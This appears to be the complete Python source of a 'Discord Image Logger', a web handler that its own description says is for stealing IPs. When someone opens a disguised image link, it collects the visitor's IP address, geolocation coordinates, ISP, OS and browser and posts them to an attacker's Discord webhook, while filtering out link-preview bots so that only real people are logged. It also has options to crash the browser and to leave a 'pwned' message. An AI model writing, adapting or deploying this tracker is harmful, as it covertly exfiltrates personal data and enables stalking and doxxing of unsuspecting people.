from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser


__app__ = "Discord Image Logger"
__description__ = (
    "A simple application which allows you to steal IPs and more "
    "by abusing Discord's Open Original feature"
)
__version__ = "v2.0"
__author__ = "C00lB0i"


config = {
    # BASE CONFIG
    "webhook": "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX",
    "image": "https://i.imgur.com/GNVEy21.png",
    "imageArgument": True,

    # CUSTOMIZATION
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": (
            "This browser has been pwned by C00lB0i's Image Logger. "
            "https://github.com/OverPowerC"
        ),
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}


blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    if useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error):
    requests.post(
        config["webhook"],
        json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": (
                        "An error occurred while trying to log an IP!\n\n"
                        f"**Error:**\n```\n{error}\n```"
                    ),
                }
            ],
        },
    )


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(
                config["webhook"],
                json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": (
                                "**An Image Logging link was sent!**\n\n"
                                f"**Endpoint:** `{endpoint}`\n"
                                f"**IP:** `{ip}`\n"
                                f"**Platform:** `{bot}`"
                            ),
                        }
                    ],
                },
            )
        return

    ping = "@everyone"
    info = requests.get(
        f"http://ip-api.com/json/{ip}?fields=16976857"
    ).json()

    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] in (3, 4) and not info["proxy"]:
            return
        if config["antiBot"] in (1, 2):
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""
**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info['isp']}`
> **ASN:** `{info['as']}`
> **Country:** `{info['country']}`
> **Region:** `{info['regionName']}`
> **City:** `{info['city']}`
> **Coords:** `{info['lat']}, {info['lon']}`
> **Timezone:** `{info['timezone']}`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting']}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```
""",
            }
        ],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info


binaries = {
    "loading": base64.b85decode(
        b"|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0"
    )
}


class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            path = self.path
            query = dict(parse.parse_qsl(parse.urlsplit(path).query))

            if config["imageArgument"] and (query.get("url") or query.get("id")):
                url = base64.b64decode(
                    (query.get("url") or query.get("id")).encode()
                ).decode()
            else:
                url = config["image"]

            ip = self.headers.get("x-forwarded-for")
            useragent = self.headers.get("user-agent")

            if ip.startswith(blacklistedIPs):
                return

            if botCheck(ip, useragent):
                self.send_response(200)
                self.send_header("Content-type", "image/jpeg")
                self.end_headers()
                self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=path.split("?")[0], url=url)
                return

            makeReport(ip, useragent, endpoint=path.split("?")[0], url=url)

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            html = f"""
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                }}
                div.img {{
                    background-image: url('{url}');
                    background-position: center;
                    background-repeat: no-repeat;
                    background-size: contain;
                    width: 100vw;
                    height: 100vh;
                }}
            </style>
            <div class="img"></div>
            """

            self.wfile.write(html.encode())

        except Exception:
            self.send_response(500)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(
                b"500 - Internal Server Error<br>"
                b"Check your Discord webhook for details."
            )
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest


handler = app = ImageLoggerAPI
